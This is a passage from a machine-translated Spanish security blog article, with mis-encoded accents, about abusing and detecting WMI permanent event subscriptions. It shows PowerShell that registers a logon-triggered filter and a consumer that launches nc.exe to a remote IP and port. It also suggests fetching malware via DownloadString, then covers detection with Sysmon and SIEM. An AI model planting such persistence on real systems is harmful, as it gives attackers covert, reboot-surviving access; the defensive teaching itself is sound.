Lo correcto y al mismo tiempo que requiere un conocimiento m√°s profundo es utilizar eventos WMI persistentes. Los eventos WMI permanentes, aunque de cierta complejidad, no solo son una herramienta m√°s efectiva para los esp√≠as internos que los eventos temporales, sino que tambi√©n le permiten monitorear de manera m√°s efectiva las amenazas internas. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Estudiar eventos persistentes llevar√° alg√∫n tiempo, pero representan la forma m√°s efectiva de implementar un sistema de monitoreo riguroso para sistemas grandes. Tienen m√°s capacidades que los eventos temporales de WMI. Tambi√©n se pueden usar para alertarlo sobre actividades maliciosas no est√°ndar, como el t√∫nel DNS o las infracciones de la pol√≠tica </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Zero Trust.</font></font></a><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pas√© un par de d√≠as estudiando eventos persistentes y descubr√≠ que PowerShell tiene un cmdlet especial que simplifica el proceso de crear un filtro de eventos, un consumidor y objetos WMI entre el filtro y el consumidor. Como todos sabemos, PowerShell brinda a los administradores amplias oportunidades para simplificar su trabajo. Desafortunadamente, este ejemplo muestra c√≥mo los atacantes pueden aprovechar estas excelentes caracter√≠sticas. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Una informaci√≥n privilegiada crea un evento constante en el sistema de destino, liber√°ndose de la necesidad de estar presente en una sesi√≥n de shell. El evento permanece all√≠ para siempre o hasta que se elimine expl√≠citamente. Puedes leer m√°s sobre c√≥mo hacer esto </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">aqu√≠.</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pero en general el proceso es similar a lo que hice anteriormente con un evento temporal. </font><font style="vertical-align: inherit;">Lo √∫ltimo que necesita nuestro hacker es asociar un filtro de eventos con un consumidor de eventos. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Estoy de acuerdo en que para un empleado ordinario que de repente decidi√≥ convertirse en un hacker malvado, esto se ve demasiado genial. </font><font style="vertical-align: inherit;">En aras del inter√©s, le√≠ varios </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">foros</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> y vi que muchas personas luchan sin √©xito para que los eventos constantes de WMI funcionen. </font><font style="vertical-align: inherit;">Sin embargo, esto no va m√°s all√° de las capacidades de nuestros "Snowden" y otros administradores de sistemas inteligentes que decidieron cambiar al lado oscuro.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Eventos constantes: consejos para administradores de TI</font></font></font></h2><br>
<img src="https://habrastorage.org/webt/8c/gh/rn/8cghrnfq5mao1zm9d5-95y2kdys.jpeg"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Estos m√©todos no est√°n destinados a capacitar a posibles piratas inform√°ticos o empleados ofendidos que quieran vengarse del empleador. </font><font style="vertical-align: inherit;">Todo lo que quiero hacer es ayudar a los profesionales de TI a comprender la mentalidad del pirata inform√°tico para que puedan implementar la protecci√≥n adecuada contra los ataques de penetraci√≥n. </font><font style="vertical-align: inherit;">Para ellos, muestro c√≥mo configurar el filtro y los objetos de consumo con el </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmdlet Set-WmiInstance</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> :</font></font><br>
<br>
<pre><code class="plaintext hljs">$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{<font></font>
<font></font>
EventNamespace = 'root/cimv2'<font></font>
Name = ‚Äúcruella‚Äù<font></font>
Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LoggedOnUser'"<font></font>
QueryLanguage = 'WQL'<font></font>
}<font></font>
<font></font>
<font></font>
$command = "powershell.exe -Command {$names = gwmi Win32_Process; $users=@(); foreach ($n in $names) {$users += $n.GetOwner().User}; foreach ($u in $users) {if ($u -eq 'cruella') { C:\users\lex\Documents\nc.exe 172.31.45.240 10000}}}"<font></font>
<font></font>
<font></font>
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{<font></font>
Name = "Consumer"<font></font>
CommandLineTemplate = $Command<font></font>
<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Su tarea es crear un c√≥digo de PowerShell que vincule estos dos componentes. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En el curso de mis propias pruebas, pude conseguir un evento permanente para trabajar en el sistema objetivo sin un esfuerzo y sufrimiento innecesarios. </font><font style="vertical-align: inherit;">Como recordar√°, esto fue muy dif√≠cil de lograr con eventos WMI temporales que duran tanto como una sesi√≥n de PowerShell.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Al configurar un evento WMI permanente para, por ejemplo, monitorear el inicio de sesi√≥n del usuario, no se requiere que un intruso o hacker permanezca en el sistema de destino. Una ventaja adicional es que un evento WMI persistente es robusto: cuando la computadora se reinicia, los disparadores de eventos a√∫n funcionan. Esto hace que los eventos persistentes de WMI sean una forma poderosa y encubierta de desencadenar un ataque, que puede implicar mucho m√°s que solo monitorear. Como recordar√°, los eventos de WMI est√°n lejos del primer lugar donde los especialistas en seguridad buscar√°n la fuente del ataque. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Por ejemplo, el c√≥digo de PowerShell para un consumidor de eventos puede actuar como un iniciador y descargar malware almacenado en un servidor remoto mediante </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DownloadString</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . Gran </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">presentaci√≥n</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Matt Graber en la conferencia Black Hat contiene mucha informaci√≥n sobre el potencial malicioso de los eventos persistentes de WMI. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Si es un especialista en seguridad, ¬øc√≥mo trabajar√° con los eventos de WMI en t√©rminos de su posible uso malicioso? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Buena suerte de su parte: con el cmdlet Get-WmiObject (alias gwmi), puede crear una lista de filtros de eventos, consumidores y objetos de enlace:</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/ug/ql/gd/ugqlgdjx1alwtunb4oczheoxh3k.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Enumera los eventos persistentes de WMI con Get-WMIObject y establece los par√°metros adecuados. </font><font style="vertical-align: inherit;">Tenga en cuenta la falta de una marca de tiempo. </font></font><br>
 <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ahora, si encuentran sospechoso el filtro (o consumidor) de un evento permanente, los profesionales de TI pueden desactivarlo elimin√°ndolo mediante la canalizaci√≥n de PowerShell y el </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmdlet WMI-RemoveObject</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> :</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/uo/t-/lj/uot-ljlw9zzi_jw5xosdyeaikwa.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 La eliminaci√≥n de eventos WMI persistentes implica el uso de la canalizaci√≥n de PowerShell. </font></font><br>
 <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tenga en cuenta que aqu√≠ no se especifica ni la hora en que se gener√≥ el evento ni el nombre del usuario malintencionado. </font><font style="vertical-align: inherit;">Para obtener esta informaci√≥n forense, deber√° consultar los registros de eventos de Windows. </font><font style="vertical-align: inherit;">M√°s sobre esto a continuaci√≥n.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">¬øPuedo deshabilitar eventos WMI persistentes?</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Como m√≠nimo, los profesionales de TI pueden ver r√°pidamente los eventos persistentes de WMI grabados y comenzar a analizar escenarios de la vida real en busca de signos de amenazas. Tal vez, como un experimentado especialista en seguridad de TI, usted piensa que no todos necesitan WMI en las computadoras port√°tiles y que la mejor estrategia para lidiar con las vulnerabilidades de eventos persistentes de WMI es deshabilitar completamente WMI. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Puede intentar deshabilitar el servicio </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Winmgmt</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , que inicia WMI. En la pr√°ctica, esto no es tan simple. En el curso de mis propias pruebas, no pude desactivar este servicio: se inici√≥ autom√°ticamente una y otra vez. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Supongamos que a√∫n logra deshabilitarlo. El software administrativo de Windows depende en gran medida de WMI y no funcionar√° si Winmgmt no est√° disponible. </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;">Foros en</font></a><font style="vertical-align: inherit;"> todo internet</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">lleno de mensajes de advertencia contra la desactivaci√≥n de WMI. </font><font style="vertical-align: inherit;">Le aconsejo que escuche y tenga piedad de su WMI.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Identifique eventos de amenaza WMI con Sysmon y SIEM</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En general, tendr√° que aceptar la vulnerabilidad del evento WMI como un hecho. Afortunadamente, hay formas m√°s eficientes de detectar eventos persistentes y otras operaciones de eventos sospechosos en Windows que usar el cmdlet Powershell mencionado anteriormente. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
¬°Conoce a Sysmon! No entrar√© en detalles sobre esta utilidad gratuita de Windows, que se puede descargar </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">aqu√≠</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> en este art√≠culo. Solo puedo decir que le permite obtener informaci√≥n muy √∫til para el an√°lisis en un solo lugar, en lugar de ver cada registro de eventos de Windows individualmente. Es posible que los usuarios de Windows 7 y posteriores no necesiten Sysmon, ya que los sistemas Windows m√°s nuevos utilizan mecanismos de registro est√°ndar m√°s avanzados.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/tv/-l/_2/tv-l_2ztyvfhhag1nf3faxi5qji.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Sysmon es una herramienta de registro de eventos conveniente e intuitiva de Microsoft. </font></font><br>
 <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sysmon asigna el identificador de evento 19 a la creaci√≥n de un evento de filtro WMI permanente (20 se asigna para crear un evento de consumidor WMI y 21 se asigna al enlace WMI). Si abre el visor de eventos, encontrar√° el registro de eventos de Sysmon en la secci√≥n Microsoft -&gt; Windows -&gt; Sysmon. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
No desea abrir el visor de eventos manualmente para monitorear eventos WMI persistentes, que pueden ser un signo de actividad de piratas inform√°ticos. Sabemos ayudarte. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
¬øPor qu√© no crear un filtro de eventos persistentes WMI para monitorear la creaci√≥n (adivinada) de un evento persistente WMI? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">github</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Hay un peque√±o proyecto donde encontrar√° c√≥digo para configurar esta operaci√≥n. </font><font style="vertical-align: inherit;">Aqu√≠ hay un fragmento de c√≥digo para un filtro de eventos WMI que le permite rastrear la creaci√≥n de ... s√≠, un filtro de eventos WMI:</font></font><br>
<br>
<pre><code class="plaintext hljs">$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{<font></font>
EventNamespace = 'root/subscription'<font></font>
Name = '_PersistenceEvent_'<font></font>
Query = 'SELECT * FROM __InstanceCreationEvent WITHIN 5 Where TargetInstance ISA "__EventConsumer"'<font></font>
<font></font>
QueryLanguage = 'WQL'<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Obviamente, aqu√≠ necesitamos la ayuda de herramientas de seguridad de la informaci√≥n y gesti√≥n de eventos de seguridad (SIEM), porque la evidencia est√° enterrada en los escombros de las revistas. </font><font style="vertical-align: inherit;">Creo que entiendes a d√≥nde va todo. </font><font style="vertical-align: inherit;">Necesitar√° una </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">soluci√≥n de monitoreo de seguridad</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> que combine las caracter√≠sticas de SIEM con el an√°lisis de otras amenazas para detectar y eliminar las amenazas asociadas con eventos WMI persistentes.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Preguntas frecuentes sobre el Instrumental de administraci√≥n de Windows</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Los m√©todos descritos anteriormente pueden usarse para implementar un sistema de vigilancia en su red, sin embargo, es posible que tenga algunas preguntas sobre WMI. </font><font style="vertical-align: inherit;">En esta secci√≥n, responderemos las m√°s comunes.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">¬øWMI est√° en desuso?</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
WMI en s√≠ no est√° desactualizado, pero WMIC ha quedado en desuso, lo que es confuso para muchas personas. </font><font style="vertical-align: inherit;">PowerShell ahora se usa para acceder a las funciones proporcionadas anteriormente por WMIC.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">¬øQu√© puertos usa WMI? </font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
WMI utiliza el puerto TCP 135 y varios puertos din√°micos: 49152-65535 (puertos RPC din√°micos: Windows Vista, 2008 y superior), TCP 1024-65535 (puertos RPC din√°micos: Windows NT4, Windows 2000, Windows 2003). </font><font style="vertical-align: inherit;">Tambi√©n puede configurar un rango de puertos personalizado para WMI.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">¬øWMI usa WimRM? </font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Esta configuraci√≥n no es est√°ndar, pero puede usar WMI para recuperar datos usando scripts o aplicaciones usando la API de scripts WinRM, o usando la herramienta de l√≠nea de comandos Winrm. </font><font style="vertical-align: inherit;">WinRM puede usar WMI para recopilar datos de recursos o para administrar recursos en el sistema operativo Windows.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Conclusi√≥n</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Como hemos visto, WMI proporciona a los administradores una herramienta poderosa para monitorear procesos remotos y computadoras y puede usarse en el desarrollo de acuerdos de monitoreo de usuario final (EUMA) para alertar autom√°ticamente la actividad sospechosa. </font><font style="vertical-align: inherit;">Esto lo convierte en una gran herramienta para detectar y eliminar amenazas internas, prevenir intentos de eludir las pol√≠ticas de seguridad y supervisar c√≥mo se utilizan sus sistemas. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Si desea obtener m√°s informaci√≥n sobre c√≥mo usar WMI para monitorear la actividad interna, puede descargar nuestra gu√≠a detallada </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">aqu√≠</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../es507048/index.html">Olya, pruebas y f√°brica: el camino hacia una bella arquitectura y un c√≥digo limpio</a></li>
<li><a href="../es507050/index.html">An√°lisis del dise√±o del juego Hollow Knight. Parte 1. Encrucijada olvidada</a></li>
<li><a href="../es507052/index.html">El mejor cient√≠fico de datos no pierde el tiempo en estad√≠sticas</a></li>
<li><a href="../es507058/index.html">Joel Spolsky: papel de la gamificaci√≥n en el √©xito del desbordamiento de pila</a></li>
<li><a href="../es507066/index.html">10 maneras de automatizar anuncios en Google Ads</a></li>
<li><a href="../es507074/index.html">Hoja de trucos SIMD, ahora para .NET Core</a></li>
<li><a href="../es507078/index.html">El tribunal orden√≥ a los medios que eliminaran el art√≠culo de otra persona y publicaran una refutaci√≥n en el Yandex principal.</a></li>
<li><a href="../es507080/index.html">All Cups: La historia de un gran dise√±o de ecosistema</a></li>
<li><a href="../es507084/index.html">Las fiestas SpatialChat se hicieron populares durante la pandemia, y es poco probable que terminen despu√©s de la cala</a></li>
<li><a href="../es507086/index.html">Convierta el script Bash a c√≥digo C # para enviar SMS a trav√©s del m√≥dem usb HUAWEI E3372</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>